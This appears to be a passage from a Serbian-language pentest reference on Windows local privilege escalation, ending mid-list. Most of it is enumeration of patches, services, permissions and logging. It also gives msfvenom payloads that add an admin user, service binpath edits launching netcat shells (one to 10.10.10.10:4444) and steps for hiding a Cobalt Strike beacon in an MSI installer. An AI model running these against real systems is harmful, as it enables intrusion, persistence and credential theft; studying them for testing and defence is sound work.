# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Najbolji alat za pretragu Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Uvodna Windows teorija

### Access Tokens

**Ako ne znate šta su Windows Access Tokens, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Pogledajte sledeću stranicu za više informacija o ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Ako ne znate šta su integrity levels u Windows, trebalo bi da pročitate sledeću stranicu pre nego što nastavite:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows bezbednosne kontrole

Postoje različite stvari u Windows koje mogu da vam **onemoguće enumerisanje sistema**, da spreče pokretanje izvršnih fajlova ili čak da **otkriju vaše aktivnosti**. Trebalo bi da **pročitate** sledeću **stranicu** i **enumerišete** sve ove **odbrambene mehanizme** pre nego što započnete privilege escalation enumeration:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## Informacije o sistemu

### Enumeracija informacija o verziji

Proverite da li Windows verzija ima poznate ranjivosti (proverite i primenjene zakrpe).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Eksploiti verzija

Ovaj [site](https://msrc.microsoft.com/update-guide/vulnerability) je koristan za pronalaženje detaljnih informacija o Microsoft bezbednosnim ranjivostima. Ova baza podataka sadrži više od 4.700 bezbednosnih ranjivosti, što pokazuje **ogromnu površinu napada** koju predstavlja Windows okruženje.

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ima ugrađen watson)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Okruženje

Ima li sačuvanih credential/Juicy informacija u env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Istorija
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript datoteke

Možete saznati kako da ovo uključite na [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Detalji izvršavanja PowerShell pipeline-a se beleže, obuhvatajući izvršene komande, pozive komandi i delove skripti. Međutim, potpuni detalji izvršavanja i rezultati izlaza možda neće biti zabeleženi.

Da biste ovo omogućili, sledite uputstva u odeljku "Transcript files" dokumentacije, birajući **"Module Logging"** umesto **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Da biste pregledali poslednjih 15 događaja iz PowerShell logova, možete izvršiti:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Kompletan zapis aktivnosti i celokupnog sadržaja izvršavanja skripte se beleži, osiguravajući da je svaki blok koda dokumentovan tokom izvršavanja. Ovaj proces čuva sveobuhvatan audit trail svake aktivnosti, koristan za forensics i analizu malicioznog ponašanja. Dokumentovanjem sve aktivnosti u trenutku izvršenja dobijaju se detaljni uvidi u proces.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Zabeleženi događaji za Script Block mogu se pronaći u Windows Event Viewer-u na putanji: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.  
Za prikaz poslednjih 20 događaja možete koristiti:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Podešavanja interneta
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Pogoni
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Možete kompromitovati sistem ako se ažuriranja ne zahtevaju koristeći http**S**, već http.

Počnite tako što ćete proveriti da li mreža koristi non-SSL WSUS ažuriranja pokretanjem sledeće komande u cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ili sledeće u PowerShell-u:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Ako dobijete odgovor kao jedan od ovih:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
A ako je `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ili `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` jednako `1`.

Then, **it is exploitable.** Ako je poslednja vrednost registra jednaka 0, tada će WSUS unos biti ignorisan.

Da biste iskoristili ovu ranjivost možete koristiti alate kao što su: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Pročitajte istraživanje ovde:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
U suštini, ovo je propust koji ovaj bug iskorišćava:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

Možete iskoristiti ovu ranjivost koristeći alat [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (nakon što bude objavljen).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Mnogi enterprise agenti izlažu localhost IPC površinu i privilegovani update kanal. Ako se enrollment može prisiliti na napadački server i updater veruje rogue root CA ili ima slabe provere potpisa, lokalni korisnik može dostaviti maliciozni MSI koji SYSTEM servis instalira. Pogledajte generalizovanu tehniku (zasnovanu na Netskope stAgentSvc lancu – CVE-2025-0309) ovde:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

A **local privilege escalation** vulnerability exists in Windows **domain** environments under specific conditions. These conditions include environments where **LDAP signing is not enforced,** users possess self-rights allowing them to configure **Resource-Based Constrained Delegation (RBCD),** and the capability for users to create computers within the domain. It is important to note that these **requirements** are met using **default settings**.

Pronađite **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Za više informacija o toku napada pogledajte [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** ova 2 ključa registra su **enabled** (vrednost je **0x1**), tada korisnici bilo kog privilegija mogu **install** (execute) `*.msi` fajlove kao NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Ako imate meterpreter sesiju, možete automatizovati ovu tehniku koristeći modul **`exploit/windows/local/always_install_elevated`**

### PowerUP

Upotrebite komandu `Write-UserAddMSI` iz power-up da kreirate u trenutnom direktorijumu Windows MSI binarni fajl za eskalaciju privilegija. Ovaj skript ispisuje prekompajlirani MSI instalacioni program koji traži dodavanje korisnika/grupe (tako da će vam trebati GIU pristup):
```
Write-UserAddMSI
```
Samo pokrenite kreirani binarni fajl da biste eskalirali privilegije.

### MSI Wrapper

Pročitajte ovaj tutorijal da naučite kako da kreirate MSI wrapper koristeći ovaj alat. Imajte na umu da možete umotati "**.bat**" fajl ako **samo** želite da **izvršite** **komandne linije**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generišite** pomoću Cobalt Strike ili Metasploit novi **Windows EXE TCP payload** u `C:\privesc\beacon.exe`
- Otvorite **Visual Studio**, izaberite **Create a new project** i ukucajte "installer" u polje za pretragu. Izaberite **Setup Wizard** projekat i kliknite **Next**.
- Dajte projektu ime, npr. **AlwaysPrivesc**, koristite **`C:\privesc`** kao lokaciju, izaberite **place solution and project in the same directory**, i kliknite **Create**.
- Nastavite da klikćete **Next** dok ne stignete do koraka 3 od 4 (odaberite fajlove za uključivanje). Kliknite **Add** i izaberite Beacon payload koji ste upravo generisali. Zatim kliknite **Finish**.
- Označite projekat **AlwaysPrivesc** u **Solution Explorer** i u **Properties** promenite **TargetPlatform** sa **x86** na **x64**.
- Postoje i druge opcije koje možete promeniti, kao što su **Author** i **Manufacturer**, što može učiniti instaliranu aplikaciju izglednijom legitimnom.
- Kliknite desnim tasterom na projekat i izaberite **View > Custom Actions**.
- Kliknite desnim tasterom na **Install** i izaberite **Add Custom Action**.
- Dvaput kliknite na **Application Folder**, izaberite vaš **beacon.exe** fajl i kliknite **OK**. Ovo će osigurati da se beacon payload izvrši čim se instalater pokrene.
- U okviru **Custom Action Properties** promenite **Run64Bit** na **True**.
- Na kraju, **izgradite ga**.
- Ako se pojavi upozorenje `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, proverite da li ste podesili platformu na x64.

### MSI Installation

Da biste izvršili **instalaciju** zlonamernog `.msi` fajla u **pozadini:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Za exploit ove ranjivosti možete koristiti: _exploit/windows/local/always_install_elevated_

## Antivirus i detektori

### Podešavanja audita

Ova podešavanja odlučuju šta se **beleži**, pa treba obratiti pažnju
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding — zanimljivo je znati gde se šalju logovi
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** je dizajniran za **upravljanje lozinkama lokalnog Administratora**, obezbeđujući da je svaka lozinka **jedinstvena, nasumična i redovno ažurirana** na računarima priključenim na domen. Ove lozinke se sigurno čuvaju u Active Directory i mogu im pristupiti samo korisnici kojima su putem ACLs dodeljena odgovarajuća ovlašćenja, što im omogućava da, ako su ovlašćeni, vide lozinke lokalnog Administratora.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ako je aktivan, **plain-text lozinke se čuvaju u LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Počevši od **Windows 8.1**, Microsoft je uveo poboljšanu zaštitu za Local Security Authority (LSA) kako bi **blokirao** pokušaje nepouzdanih procesa da **čitaju njegovu memoriju** ili ubrizgavaju kod, dodatno osiguravajući sistem.\
[**Više informacija o LSA Protection ovde**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** je uveden u **Windows 10**. Njegova svrha je da zaštiti credentials koji su sačuvani na uređaju od pretnji kao što su pass-the-hash napadi.| [**Više informacija o Credentials Guard ovde.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** se autentifikuju od strane **Local Security Authority** (LSA) i koriste ih komponente operativnog sistema. Kada su logon podaci korisnika autentifikovani od strane registrovanog security package-a, domain credentials za korisnika se obično uspostavljaju.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Korisnici & Grupe

### Enumeracija korisnika i grupa

Trebalo bi da proverite da li neke od grupa kojima pripadate imaju zanimljive dozvole
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privilegovane grupe

Ako pripadate nekoj privilegovanoj grupi, možda ćete moći da eskalirate privilegije. Saznajte o privilegovanim grupama i kako ih zloupotrebiti da biste eskalirali privilegije ovde:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulacija tokenima

**Saznajte više** o tome šta je **token** na ovoj stranici: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Pogledajte sledeću stranicu da biste **saznali o interesantnim tokenima** i kako ih zloupotrebiti:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Prijavljeni korisnici / sesije
```bash
qwinsta
klist sessions
```
### Kućni direktorijumi
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Politika lozinki
```bash
net accounts
```
### Dohvati sadržaj međuspremnika
```bash
powershell -command "Get-Clipboard"
```
## Pokrenuti procesi

### Dozvole fajlova i foldera

Prvo, prilikom listanja procesa **proverite da li se lozinke nalaze u komandnoj liniji procesa**.\
Proverite da li možete **prepisati neki pokrenuti izvršni fajl** ili da li imate dozvole za pisanje u folderu sa izvršnim fajlovima da biste iskoristili moguće [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Uvek proverite da li potencijalno [**electron/cef/chromium debuggers** rade — možete to iskoristiti za eskalaciju privilegija](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Provera dozvola binarnih fajlova procesa**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Provera dozvola foldera binarnih fajlova procesa (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Možete napraviti memory dump pokrenutog procesa koristeći **procdump** iz sysinternals. Servisi kao FTP često imaju **credentials in clear text in memory**, pokušajte da dump-ujete memory i pročitate credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Nesigurne GUI aplikacije

**Aplikacije koje rade kao SYSTEM mogu dozvoliti korisniku da pokrene CMD ili pregleda direktorijume.**

Primer: "Windows Help and Support" (Windows + F1), potražite "command prompt", kliknite na "Click to open Command Prompt"

## Servisi

Service Triggers omogućavaju Windows-u da pokrene servis kada se dese određeni uslovi (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, itd.). Čak i bez prava SERVICE_START često možete pokrenuti privilegovane servise aktiviranjem njihovih triggers. Vidi tehnike enumeracije i aktivacije ovde:

-
{{#ref}}
service-triggers.md
{{#endref}}

Dobijte listu servisa:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Dozvole

Možete koristiti **sc** da dobijete informacije o servisu
```bash
sc qc <service_name>
```
Preporučuje se imati binarni fajl **accesschk** iz _Sysinternals_ za proveru potrebnog nivoa privilegija za svaku uslugu.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Preporučuje se proveriti da li "Authenticated Users" mogu izmeniti bilo koju uslugu:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Možete preuzeti accesschk.exe za XP ovde](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Omogućavanje servisa

Ako imate ovu grešku (na primer sa SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Možete ga omogućiti koristeći
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Imajte na umu da servis upnphost zavisi od SSDPSRV da bi funkcionisao (za XP SP1)**

**Još jedno rešenje** ovog problema je pokretanje:
```
sc.exe config usosvc start= auto
```
### **Izmeni putanju binarne datoteke servisa**

U situaciji kada grupa "Authenticated users" poseduje **SERVICE_ALL_ACCESS** nad servisom, izmena izvršne binarne datoteke servisa je moguća. Za izmenu i pokretanje **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Ponovo pokreni servis
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privilegije se mogu eskalirati putem različitih dozvola:

- **SERVICE_CHANGE_CONFIG**: Dozvoljava rekonfiguraciju binarnog fajla servisa.
- **WRITE_DAC**: Omogućava promenu dozvola, što može dovesti do mogućnosti promene konfiguracija servisa.
- **WRITE_OWNER**: Dozvoljava sticanje vlasništva i promenu dozvola.
- **GENERIC_WRITE**: Omogućava promenu konfiguracija servisa.
- **GENERIC_ALL**: Takođe omogućava promenu konfiguracija servisa.

Za detekciju i eksploataciju ove ranjivosti može se koristiti _exploit/windows/local/service_permissions_.

### Slabe dozvole za binarne fajlove servisa

**Proverite da li možete izmeniti binarni fajl koji se izvršava putem servisa** ili da li imate **write permissions on the folder** gde se binarni fajl nalazi ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Možete dobiti sve binarne fajlove koje servis izvršava koristeći **wmic** (not in system32) i proveriti svoje dozvole koristeći **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Takođe možete koristiti **sc** i **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Dozvole za izmenu registra servisa

Trebalo bi da proverite da li možete da izmenite bilo koji registar servisa.\
Možete **proveriti** svoje **dozvole** nad **registrom** servisa tako što ćete:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Treba proveriti da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** imaju `FullControl` dozvole. Ako imaju, binarni fajl koji servis izvršava može biti izmenjen.

Da biste promenili Path izvršavanog binarnog fajla:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Dozvole AppendData/AddSubdirectory u registru servisa

Ako imate ovu dozvolu nad registry-jem, to znači da **možete kreirati podregistre iz ovog**. U slučaju Windows servisa, ovo je **dovoljno za izvršavanje proizvoljnog koda:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Putanje servisa bez navodnika

Ako putanja do izvršnog fajla nije u navodnicima, Windows će pokušati da izvrši svaki deo koji se pojavljuje pre razmaka.

Na primer, za putanju _C:\Program Files\Some Folder\Service.exe_ Windows će pokušati da izvrši:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Navedite sve unquoted service paths, izuzimajući one koje pripadaju ugrađenim Windows servisima:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Možete otkriti i iskoristiti** ovu ranjivost pomoću metasploit-a: `exploit/windows/local/trusted\_service\_path` Možete ručno kreirati binarnu datoteku servisa koristeći metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Akcije oporavka

Windows omogućava korisnicima da odrede akcije koje će se preduzeti ako servis zakaže. Ova funkcionalnost može biti konfigurisana da upućuje na binary. Ako se taj binary može zameniti, privilege escalation može biti moguć. Više detalja možete pronaći u [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Aplikacije

### Instalirane aplikacije

Proverite **dozvole za binaries** (možda možete overwrite jedan i escalate privileges) i **foldere** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Dozvole za pisanje

Proverite da li možete izmeniti neki konfiguracioni fajl da biste pročitali neki poseban fajl ili da li možete izmeniti neki binarni fajl koji će biti izvršen od strane Administrator naloga (schedtasks).

Jedan način da pronađete slabe dozvole za foldere/fajlove u sistemu je:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Pokretanje pri podizanju sistema

**Proverite da li možete prepisati neki registry ili binary koji će biti izvršen od strane drugog korisnika.**\
**Pročitajte** **sledeću stranicu** da saznate više o zanimljivim **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drajveri

Potražite moguće **third party weird/vulnerable** drajvere
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Ako driver izlaže arbitrary kernel read/write primitive (češće u poorly designed IOCTL handlers), možeš eskalirati privilegije tako što ćeš ukrasti SYSTEM token direktno iz kernel memorije. Pogledaj step‑by‑step tehniku ovde:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Zloupotreba nedostatka FILE_DEVICE_SECURE_OPEN na device objects (LPE + EDR kill)

Neki signed third‑party drivers kreiraju svoj device object sa jakim SDDL koristeći IoCreateDeviceSecure, ali zaborave da postave FILE_DEVICE_SECURE_OPEN u DeviceCharacteristics. Bez ovog flag‑a, secure DACL se ne primenjuje kada se device otvara putem path‑a koji sadrži dodatnu komponentu, što omogućava bilo kojem neprivilegovanom korisniku da dobije handle koristeći namespace path poput:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Kada korisnik može da otvori device, privileged IOCTLs koje driver izlaže mogu se zloupotrebiti za LPE i tampering. Primeri mogućnosti viđeni u prirodi:
